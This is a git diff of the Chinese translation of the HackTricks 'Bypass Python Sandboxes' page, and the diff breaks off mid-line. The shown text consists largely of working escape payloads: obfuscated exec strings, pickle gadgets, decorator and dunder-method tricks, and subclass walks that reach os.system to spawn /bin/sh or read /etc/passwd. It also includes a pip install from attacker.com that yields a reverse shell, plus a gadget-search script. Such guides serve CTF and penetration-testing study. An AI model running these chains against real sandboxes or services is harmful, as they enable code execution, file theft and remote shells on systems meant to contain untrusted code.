@@ -1,18 +1,19 @@
-# 绕过 Python 沙盒
+# 绕过 Python 沙箱
+
+{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS 红队专家）</strong></a><strong>！</strong></summary>
+<summary>支持 HackTricks</summary>
 
-支持 HackTricks 的其他方式：
-
-* 如果您想看到您的**公司在 HackTricks 中做广告**或**下载 PDF 版本的 HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
-* 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
-* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
+{% endhint %}
 
 **Try Hard Security Group**
 
@@ -22,11 +23,11 @@
 
 ***
 
-这些是绕过 Python 沙盒保护并执行任意命令的一些技巧。
+这些是一些绕过 Python 沙箱保护并执行任意命令的技巧。
 
 ## 命令执行库
 
-您需要了解的第一件事是，您是否可以直接使用某个已导入的库执行代码，或者您是否可以导入以下任何库：
+你需要知道的第一件事是，你是否可以直接使用某个已导入的库执行代码，或者你是否可以导入这些库中的任何一个：
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -59,23 +60,23 @@ open('/var/www/html/input', 'w').write('123')
 execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
-记住，`open` 和 `read` 函数可以用于在 Python 沙盒内读取文件，并编写一些代码来执行以绕过沙盒。
+记住，_**open**_ 和 _**read**_ 函数可以用于 **读取文件** 在 python 沙箱内，并 **编写一些代码** 你可以 **执行** 来 **绕过** 沙箱。
 
 {% hint style="danger" %}
-**Python2 input()** 函数允许在程序崩溃之前执行 Python 代码。
+**Python2 input()** 函数允许在程序崩溃之前执行 python 代码。
 {% endhint %}
 
-Python 会首先尝试从当前目录加载库（以下命令将打印 Python 加载模块的位置）：`python3 -c 'import sys; print(sys.path)'`
+Python 尝试 **首先从当前目录加载库**（以下命令将打印 python 从哪里加载模块）： `python3 -c 'import sys; print(sys.path)'`
 
 ![](<../../../.gitbook/assets/image (559).png>)
 
-## 使用默认安装的 Python 包绕过 pickle 沙盒
+## 使用默认安装的 python 包绕过 pickle 沙箱
 
 ### 默认包
 
-您可以在此处找到**预安装的**包列表：[https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
-请注意，通过 pickle，您可以使 Python 环境导入系统中安装的**任意库**。\
-例如，加载以下 pickle 时将导入 pip 库以使用它：
+你可以在这里找到 **预安装包的列表**: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
+请注意，从一个 pickle 中你可以使 python 环境 **导入系统中安装的任意库**。\
+例如，以下 pickle，在加载时，将导入 pip 库以使用它：
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
 #however, the victim doesn't even need to have the library installed to execute it
@@ -88,30 +89,32 @@ return (pip.main,(["list"],))
 
 print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 ```
-### Pip软件包
+有关 pickle 工作原理的更多信息，请查看此链接: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
 
-由**@isHaacK**分享的技巧
+### Pip 包
 
-如果您可以访问`pip`或`pip.main()`，您可以安装任意软件包并调用以获得反向shell：
+技巧由 **@isHaacK** 分享
+
+如果您可以访问 `pip` 或 `pip.main()`，您可以安装任意包并通过以下方式获得反向 shell:
 ```bash
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-你可以在这里下载创建反向shell的软件包。请注意，在使用之前，你应该**解压缩它，更改`setup.py`，并将你的IP放入反向shell中**：
+您可以在此处下载创建反向 shell 的包。请注意，在使用之前，您应该**解压缩它，修改 `setup.py`，并输入您的反向 shell 的 IP**：
 
 {% file src="../../../.gitbook/assets/Reverse.tar (1).gz" %}
 
 {% hint style="info" %}
-这个软件包名为`Reverse`。然而，它经过特殊设计，当你退出反向shell时，安装的其余部分将失败，因此当你离开时**不会在服务器上留下任何额外的Python软件包**。
+这个包被称为 `Reverse`。然而，它是特别制作的，以便当您退出反向 shell 时，其余的安装将失败，因此您**在离开时不会在服务器上留下任何额外的 python 包**。
 {% endhint %}
 
-## 评估Python代码
+## 评估 python 代码
 
 {% hint style="warning" %}
-请注意，exec允许多行字符串和“;”，但eval不允许（检查海象操作符）
+请注意，exec 允许多行字符串和“;”，但 eval 不允许（检查海象运算符）
 {% endhint %}
 
-如果某些字符被禁止，你可以使用**十六进制/八进制/Base64**表示来**绕过**限制：
+如果某些字符被禁止，您可以使用**十六进制/八进制/B64**表示法来**绕过**限制：
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -132,7 +135,7 @@ exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x
 exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
 exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 ```
-### 允许评估 Python 代码的其他库
+### 其他允许评估 Python 代码的库
 ```python
 #Pandas
 import pandas as pd
@@ -146,7 +149,7 @@ df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")
 # Like:
 df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
 ```
-## 运算符和简便技巧
+## 操作符和简短技巧
 ```python
 # walrus operator allows generating variable inside a list
 ## everything will be executed in order
@@ -155,9 +158,9 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 [y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
 ## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
 ```
-## 通过编码（UTF-7）绕过保护
+## 通过编码绕过保护 (UTF-7)
 
-在[**这篇文章**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)中，使用UTF-7来加载和执行任意Python代码，绕过了一个明显的沙盒：
+在 [**这篇文章**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) 中，使用 UFT-7 在一个看似沙箱的环境中加载和执行任意的 python 代码：
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -168,13 +171,13 @@ return x
 #+AAo-print(open("/flag.txt").read())
 """.lstrip()
 ```
-也可以使用其他编码方式来绕过，例如 `raw_unicode_escape` 和 `unicode_escape`。
+也可以使用其他编码绕过它，例如 `raw_unicode_escape` 和 `unicode_escape`。
 
-## 无需调用的Python执行
+## 无调用的 Python 执行
 
-如果你被限制在一个**不允许调用的Python监狱**中，仍然有一些方法可以**执行任意函数、代码**和**命令**。
+如果您在一个 **不允许您进行调用** 的 python 监狱中，仍然有一些方法可以 **执行任意函数、代码** 和 **命令**。
 
-### 使用[装饰器](https://docs.python.org/3/glossary.html#term-decorator)进行RCE
+### 使用 [decorators](https://docs.python.org/3/glossary.html#term-decorator) 的 RCE
 ```python
 # From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
 @exec
@@ -196,13 +199,13 @@ X = exec(X)
 @'__import__("os").system("sh")'.format
 class _:pass
 ```
-### 利用创建对象和重载实现RCE
+### RCE 创建对象和重载
 
-如果你可以**声明一个类**并**创建该类的一个对象**，你可以**编写/重写不同的方法**，这些方法可以在**不需要直接调用它们**的情况下被**触发**。
+如果你可以 **声明一个类** 并 **创建该类的对象**，你可以 **编写/覆盖不同的方法**，这些方法可以在 **不需要直接调用它们** 的情况下 **被触发**。
 
-#### 使用自定义类实现RCE
+#### 使用自定义类的 RCE
 
-你可以修改一些**类方法**（通过重写现有的类方法或创建一个新的类）来使它们在被**触发**时执行**任意代码**，而无需直接调用它们。
+你可以修改一些 **类方法**（_通过覆盖现有类方法或创建一个新类_），使它们在 **被触发** 时 **执行任意代码**，而无需直接调用它们。
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -252,9 +255,9 @@ __iand__ (k = 'import os; os.system("sh")')
 __ior__ (k |= 'import os; os.system("sh")')
 __ixor__ (k ^= 'import os; os.system("sh")')
 ```
-#### 使用[元类](https://docs.python.org/3/reference/datamodel.html#metaclasses)创建对象
+#### 使用 [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses) 创建对象
 
-元类允许我们做的关键事情是，通过使用目标类作为元类，创建一个新的类，从而**实例化一个类，而无需直接调用构造函数**。
+metaclasses 允许我们做的关键事情是 **在不直接调用构造函数的情况下创建类的实例**，通过将目标类作为 metaclass 创建一个新类。
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
 # This will define the members of the "subclass"
@@ -269,9 +272,9 @@ Sub['import os; os.system("sh")']
 
 ## You can also use the tricks from the previous section to get RCE with this object
 ```
-#### 通过异常创建对象
+#### 创建带有异常的对象
 
-当**触发异常**时，会**创建**一个**Exception**对象，而无需直接调用构造函数（来自[**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)的技巧）:
+当**异常被触发**时，**Exception**的一个对象会被**创建**，而无需您直接调用构造函数（来自[**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)的技巧）：
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -291,7 +294,7 @@ k + 'import os; os.system("sh")' #RCE abusing __add__
 
 ## You can also use the tricks from the previous section to get RCE with this object
 ```
-### 更多远程代码执行
+### 更多 RCE
 ```python
 # From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
 # If sys is imported, you can sys.excepthook and trigger it by triggering an error
@@ -313,7 +316,7 @@ __iadd__ = eval
 __builtins__.__import__ = X
 {}[1337]
 ```
-### 使用内置帮助和许可证读取文件
+### 使用内置函数读取文件帮助和许可证
 ```python
 __builtins__.__dict__["license"]._Printer__filenames=["flag"]
 a = __builtins__.help
@@ -322,22 +325,22 @@ a.__class__.__exit__ = lambda self, *args: None
 with (a as b):
 pass
 ```
-## 内置函数
+## Builtins
 
-* [**Python2的内置函数**](https://docs.python.org/2/library/functions.html)
-* [**Python3的内置函数**](https://docs.python.org/3/library/functions.html)
+* [**Python2 的内置函数**](https://docs.python.org/2/library/functions.html)
+* [**Python3 的内置函数**](https://docs.python.org/3/library/functions.html)
 
-如果可以访问**`__builtins__`**对象，您可以导入库（请注意，您还可以在最后一节中显示的其他字符串表示中使用）。
+如果你可以访问 **`__builtins__`** 对象，你可以导入库（注意你也可以在最后一节中使用其他字符串表示）：
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
 ```
-### 无内建函数
+### No Builtins
 
-当你没有 `__builtins__` 时，你将无法导入任何东西，甚至无法读取或写入文件，因为**所有的全局函数**（如 `open`、`import`、`print`...）**都没有被加载**。\
-然而，**默认情况下，Python会在内存中导入许多模块**。这些模块可能看起来无害，但其中一些**也导入了危险的**功能，可以访问这些功能以获得**任意代码执行**。
+当你没有 `__builtins__` 时，你将无法导入任何内容，甚至无法读取或写入文件，因为 **所有的全局函数**（如 `open`、`import`、`print`...）**都没有加载**。\
+然而，**默认情况下，python 会在内存中导入很多模块**。这些模块看起来可能是无害的，但其中一些 **也在内部导入了危险** 的功能，可以被访问以获得 **任意代码执行**。
 
-在以下示例中，你可以看到如何**滥用**一些这些“**无害**”模块的加载，以**访问**其中的**危险** **功能**。
+在以下示例中，你可以观察到如何 **滥用** 一些被加载的 "**无害**" 模块，以 **访问** **危险** **功能**。 
 
 **Python2**
 ```python
@@ -361,8 +364,6 @@ import __builtin__
 get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 ```
 #### Python3
-
-#### Python3
 ```python
 # Obtain builtins from a globally defined function
 # https://docs.python.org/3/library/functions.html
@@ -381,7 +382,7 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-[**下面有一个更大的函数**](./#recursive-search-of-builtins-globals) ，可以找到数十/**数百**个您可以找到**内置函数**的**位置**。
+[**下面有一个更大的函数**](./#recursive-search-of-builtins-globals) 用于查找数十/**数百**个 **地方**，您可以找到 **内置函数**。
 
 #### Python2 和 Python3
 ```python
@@ -389,7 +390,7 @@ get_flag.__globals__['__builtins__']
 __builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
 __builtins__["__import__"]('os').system('ls')
 ```
-### 内置载荷
+### 内置有效载荷
 ```python
 # Possible payloads once you have found the builtins
 __builtins__["open"]("/etc/passwd").read()
@@ -397,9 +398,9 @@ __builtins__["__import__"]("os").system("ls")
 # There are lots of other payloads that can be abused to execute commands
 # See them below
 ```
-## 全局变量和局部变量
+## Globals and locals
 
-检查 **`globals`** 和 **`locals`** 是了解你可以访问什么的好方法。
+检查 **`globals`** 和 **`locals`** 是了解您可以访问的内容的好方法。
 ```python
 >>> globals()
 {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
@@ -423,17 +424,15 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-## 寻找全局变量的递归搜索
-
-在下面有一个更大的函数，可以找到数十/**数百**个可以找到全局变量的**位置**。
+[**下面有一个更大的函数**](./#recursive-search-of-builtins-globals) 用于查找数十/**数百**个 **位置**，您可以找到 **globals**。
 
 ## 发现任意执行
 
-在这里，我想解释如何轻松发现**加载的更危险功能**并提出更可靠的利用方法。
+在这里，我想解释如何轻松发现 **更危险的功能** 并提出更可靠的利用方法。
 
 #### 通过绕过访问子类
 
-这种技术最敏感的部分之一是能够**访问基类的子类**。在前面的示例中，可以使用`''.__class__.__base__.__subclasses__()`来实现，但还有**其他可能的方法**：
+此技术的一个最敏感部分是能够 **访问基类子类**。在之前的示例中，这是通过 `''.__class__.__base__.__subclasses__()` 完成的，但还有 **其他可能的方法**：
 ```python
 #You can access the base from mostly anywhere (in regular conditions)
 "".__class__.__base__.__subclasses__()
@@ -461,18 +460,18 @@ defined_func.__class__.__base__.__subclasses__()
 (''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
 (''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
 ```
-### 寻找已加载的危险库
+### 查找加载的危险库
 
-例如，知道使用库 **`sys`** 可以**导入任意库**，你可以搜索所有**已加载的模块中导入了 sys 的库**：
+例如，知道使用库 **`sys`** 可以 **导入任意库**，你可以搜索所有 **加载的模块中包含导入 sys 的模块**：
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
 ```
-有很多，而**我们只需要一个**来执行命令：
+有很多，**我们只需要一个**来执行命令：
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
 ```
-我们可以使用**其他已知可用于执行命令的库**来执行相同的操作：
+我们可以对**其他库**做同样的事情，这些库我们知道可以用来**执行命令**：
 ```python
 #os
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
@@ -507,7 +506,7 @@ defined_func.__class__.__base__.__subclasses__()
 #pdb
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
 ```
-此外，我们甚至可以搜索加载恶意库的模块：
+此外，我们甚至可以搜索哪些模块正在加载恶意库：
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 for b in bad_libraries_names:
@@ -526,7 +525,7 @@ builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalE
 pdb:
 """
 ```
-此外，如果您认为**其他库**可能能够**调用函数来执行命令**，我们还可以**通过函数名称**在可能的库中进行过滤：
+此外，如果您认为**其他库**可能能够**调用函数以执行命令**，我们还可以**通过函数名称过滤**可能的库：
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
@@ -557,11 +556,12 @@ load_source: NullImporter, _HackedGetData
 execfile:
 execute:
 __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
+"""
 ```
-## 递归搜索内置函数、全局变量...
+## 递归搜索内置对象、全局变量...
 
 {% hint style="warning" %}
-这真是**太棒了**。如果你正在**寻找像globals、builtins、open或任何其他对象**，只需使用这个脚本**递归地查找可以找到该对象的位置**。
+这真是**太棒了**。如果你**正在寻找像 globals、builtins、open 或其他任何对象**，只需使用这个脚本**递归查找可以找到该对象的地方。**
 {% endhint %}
 ```python
 import os, sys # Import these to find more gadgets
@@ -678,19 +678,19 @@ print(SEARCH_FOR)
 if __name__ == "__main__":
 main()
 ```
-你可以在此页面检查此脚本的输出：
+您可以在此页面查看此脚本的输出：
 
 {% content-ref url="https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md" %}
 [https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md](https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md)
 {% endcontent-ref %}
 
-## Python格式化字符串
+## Python 格式字符串
 
-如果你向Python发送一个将被格式化的字符串，你可以使用 `{}` 来访问Python的内部信息。你可以使用先前的示例来访问全局变量或内置变量。
+如果您**发送**一个将要被**格式化**的**字符串**给python，您可以使用`{}`来访问**python内部信息。**您可以使用之前的示例来访问全局变量或内置函数，例如。
 
 {% hint style="info" %}
-然而，有一个限制，你只能使用符号 `.[]`，所以你将无法执行任意代码，只能读取信息。\
